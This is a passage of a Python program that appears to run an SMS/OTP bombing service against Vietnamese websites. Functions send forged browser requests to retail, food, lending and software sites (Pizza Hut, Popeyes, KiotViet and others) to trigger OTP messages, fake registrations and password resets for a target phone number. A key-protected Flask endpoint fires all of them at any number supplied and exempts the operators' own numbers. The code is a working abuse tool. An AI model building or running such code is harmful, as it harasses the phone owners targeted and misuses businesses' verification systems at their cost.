    "_ga_LM3PQNHV6S\u003dGS1.1.1683042907.1.0.1683042907.60.0.0; _gcl_au\u003d1.1.888294803.1683042909; _ga_JLL9R732MK\u003dGS1.1.1683042909.1.0.1683042909.0.0.0; _ga_FMXKZXNRJB\u003dGS1.1.1683042909.1.0.1683042909.60.0.0; _hjSessionUser_3154488\u003deyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4aXN0aW5nIjpmYWxzZX0\u003d; _hjFirstSeen\u003d1; _hjIncludedInSessionSample_3154488\u003d0; _hjSession_3154488\u003deyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0\u003d; _hjAbsoluteSessionInProgress\u003d1; _gid\u003dGA1.2.665729834.1683042910; _gat_gtag_UA_201462250_4\u003d1; _gat_UA-222516876-1\u003d1; _fbp\u003dfb.1.1683042910188.410123624; _ga_T14T78MGX8\u003dGS1.1.1683042910.1.0.1683042910.0.0.0; _ga\u003dGA1.1.820789589.1683042908; _ga_5KHZV6MD4J\u003dGS1.1.1683042915.1.0.1683042916.0.0.0; _ga\u003dGA1.3.820789589.1683042908; _gid\u003dGA1.3.665729834.1683042910; _gat_UA-213798897-3\u003d1"
  }
  Datason = json.dumps({
    "phone": phone,
    "challenge_code":
    "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
    "challenge_method": "SHA256"
  })
  response = requests.post("https://id.icankid.vn/api/otp/challenge/",
                           headers=Headers,
                           data=Datason)


def k31(phone):
  Headers = {
    "Host": "www.kidsplaza.vn",
    "content-length": "154",
    "accept": "*/*",
    "content-type": "application/json",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://www.kidsplaza.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.kidsplaza.vn/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "cdp_blocked_sid_822178\u003d2"
  }
  Datason = json.dumps({
    "data": {
      "password": "Vrxx#1337",
      "confirm_password": "Vrxx#1337",
      "phone": phone,
      "email": "vexnolove03@gmail.com",
      "name": "Ahad Kumar",
      "website_id": "1"
    }
  })
  response = requests.post(
    "https://www.kidsplaza.vn/rest/hn/V1/customer/account/register/on-site",
    headers=Headers,
    data=Datason)


def k32(phone):
  Headers = {
    "Host":
    "app-api.selly.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "98",
    "App-Version":
    "1.0.0",
    "DEVICE-TYPE":
    "mobile",
    "os-version":
    "10",
    "os-name":
    "Browser",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Content-Type":
    "application/json;charset\u003dUTF-8",
    "Accept":
    "application/json",
    "BROWSER-VERSION":
    "112",
    "App-Version-Code":
    "10000",
    "PLATFORM":
    "Web",
    "BROWSER-NAME":
    "Chrome",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Origin":
    "https://selly.vn",
    "Sec-Fetch-Site":
    "same-site",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://selly.vn/",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "phone": f"+84{phone[1:11]}",
    "forceSendSms": True,
    "checksum": "2f40418a44ed4a1323ec6bfe920a7e579709f0e0"
  })
  response = requests.post("https://app-api.selly.vn/users/request-otp",
                           headers=Headers,
                           data=Datason)


def k33(phone):
  rds = random_string(7)
  Headers = {
    "Host":
    "www.kiotviet.vn",
    "content-length":
    "287",
    "accept":
    "application/json, text/javascript, */*; q\u003d0.01",
    "content-type":
    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "x-requested-with":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://www.kiotviet.vn",
    "sec-fetch-site":
    "same-origin",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://www.kiotviet.vn/dang-ky-webapp/?refcode\u003d746\u0026utm_source\u003dGoogle\u0026utm_medium\u003dKiotViet-Key\u0026utm_campaign\u003dGoogle-Search\u0026utm_content\u003dMien-phi-dung-thu\u0026gclid\u003dCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie":
    "source_referer\u003d%5B%22refcode%7C746%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%2C%22http-referral%7Cm.kiotviet.vn%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%5D"
  }
  Payload = {
    "phone": f"+84{phone[1:11]}",
    "code": f"{rds}",
    "name": "Ahad+Kumar",
    "email": "vexnolovr03%40gmail.com",
    "zone": "An+Giang+-+Huy%E1%BB%87n+An+Ph%C3%BA",
    "merchant": f"{rds}",
    "username": phone,
    "industry":
    "%C4%90i%E1%BB%87n+tho%E1%BA%A1i+%26+%C4%90i%E1%BB%87n+m%C3%A1y",
    "ref_code": "746",
    "industry_id": "65",
    "phone_input": phone
  }
  response = requests.post(
    "https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php",
    headers=Headers,
    data=Payload)


def k34(phone):
  Headers = {
    "Host":
    "pizzahut.vn",
    "content-length":
    "91",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://pizzahut.vn",
    "sec-fetch-site":
    "same-origin",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://pizzahut.vn/signup",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie":
    "x_polaris_sd\u003d98vLElKu62K7WNZoG06W1nsexHNKEFnfAsoJ|T5b6wSq7Trlg9g8n/c4z|gvAgcmzDnvm7JMKJFFkFr0vYtTayscI/8HhifBDClmz/odXi8MRDqfL1scd2cfpzMcqXi3BV!!"
  }
  Datason = json.dumps({
    "keyData":
    f"appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={phone}"
  })
  response = requests.post(
    "https://pizzahut.vn/callApiStorelet/user/registerRequest",
    headers=Headers,
    data=Datason)


def k35(phone):
  Headers = {
    "Host": "api.popeyes.vn",
    "content-length": "92",
    "accept": "application/json",
    "content-type": "application/json",
    "x-client": "WebApp",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://popeyes.vn",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://popeyes.vn/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_ga_X3WSB3MZGL\u003dGS1.1.1683104422.1.0.1683104429.0.0.0"
  }
  Datason = json.dumps({
    "phone": phone,
    "firstName": "Ahad",
    "lastName": "Kumar",
    "email": "vexnolove03@gmail.com"
  })
  response = requests.post("https://api.popeyes.vn/api/v1/register",
                           headers=Headers,
                           data=Datason)


def k36(phone):
  Headers = {
    "Host": "vamo.vn",
    "content-length": "24",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://vamo.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://vamo.vn/app/login",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_ga_1HXSGSN1HG\u003dGS1.1.1683203760.3.1.1683203783.0.0.0"
  }
  Datason = json.dumps({"username": phone[1:11]})
  response = requests.post(
    "https://vamo.vn/ws/api/public/login-with-otp/generate-otp",
    headers=Headers,
    data=Datason)


def k37(phone):
  Headers = {
    "Host": "api.vayvnd.vn",
    "content-length": "22",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "accept": "application/json",
    "content-type": "application/json",
    "accept-language": "vi",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://vayvnd.vn",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://vayvnd.vn/",
    "accept-encoding": "gzip, deflate, br"
  }
  Datason = json.dumps({"login": phone})
  response = requests.post("https://api.vayvnd.vn/v1/users/password-reset",
                           headers=Headers,
                           data=Datason)


def k38(phone):
  Headers = {
    "Host":
    "api.dongplus.vn",
    "content-length":
    "23",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "content-type":
    "application/json",
    "accept-language":
    "vi",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "accept":
    "*/*",
    "origin":
    "https://dongplus.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://dongplus.vn/user/login",
    "accept-encoding":
    "gzip, deflate, br",
    "cookie":
    "_gac_UA-214880719-1\u003d1.1683205605.Cj0KCQjwr82iBhCuARIsAO0EAZzC-JWGaiDhr9117gAfs0-HQP_hxEiwhMBuapICgNfpTTj7JI1Sg-IaAvZXEALw_wcB"
  }
  Datason = json.dumps({"phone": f"84{phone[1:11]}"})
  response = requests.post(
    "https://api.dongplus.vn/api/user/send-one-time-password",
    headers=Headers,
    data=Datason)


def k39(phone):
  Headers = {
    "Host":
    "api.findo.vn",
    "content-length":
    "39",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json;charset\u003dUTF-8",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://www.findo.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://www.findo.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({"mobilePhone": {"number": phone}})
  response = requests.post(
    "https://api.findo.vn/web/public/client/phone/sms-code-ts",
    headers=Headers,
    data=Datason)


app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def handle_request():
  key = str(request.args.get('key'))
  phone = str(request.args.get('sdt'))
  if key == 'lequangminh':
    i = 1
    if len(phone) == 10 or len(phone) == 11:
      if phone == '0328774559' or phone == '0911323854' or phone == '0766964006':
        data_set3 = {
          'status': 'error',
          'sdt': phone,
          'msg': 'Đòi spam số admin à nhóc'
        }
        json_set3 = json.dumps(data_set3)
        return json_set3
      else:
        while i <= 1:
          oldvayvnd(phone)
          oldpops(phone)
          oldtv360(phone)
          oldloship(phone)
          oldalfrescos(phone)
          oldfptshop(phone)
          oldfacebook(phone)
          oldtamo(phone)
          vieon(phone)
          vietid(phone)
          call1(phone)
          call2(phone)
          call3(phone)
          fptplay(phone)
          funring(phone)
          gotadi(phone)
          winmart(phone)
          moneydong(phone)
          daihocfpt(phone)
          cafeland(phone)
          atmonline(phone)
          k1(phone)
          k2(phone)
          k3(phone)
          k4(phone)
          k5(phone)
          k6(phone)
          k7(phone)
          k8(phone)
          k9(phone)
          k10(phone)
          k12(phone)
          k13(phone)
          k14(phone)
          k15(phone)
          k16(phone)
          k17(phone)
          k18(phone)
          k19(phone)
          k20(phone)
          k21(phone)
          k22(phone)
          k23(phone)
          k24(phone)
          k25(phone)
          k26(phone)
          k27(phone)
          k28(phone)
          k29(phone)
          k30(phone)
          k31(phone)
          k32(phone)
          k33(phone)
          k34(phone)
          k35(phone)
          k36(phone)
          k37(phone)
          k38(phone)
          k39(phone)
          i = i + 1
        data_set = {
          'status': 'Success',
          'sdt': phone,
          'Success': tc,
          'Failed': tb,
          'msg': 'Đã gửi thành công'
        }
        json_set = json.dumps(data_set)
        return json_set
    else:
      data_set2 = {
        'status': 'error',
        'sdt': phone,
        'msg': 'Số điện thoại phải đủ 10 số hoặc 11 số.'
      }
      json_set2 = json.dumps(data_set2)
      return json_set2
  else:
    data_set3 = {'status': 'error', 'msg': 'API Key không hợp lệ!'}
    json_set3 = json.dumps(data_set3)
    return json_set3


if __name__ == '__main__':
  app.run(host='0.0.0.0')
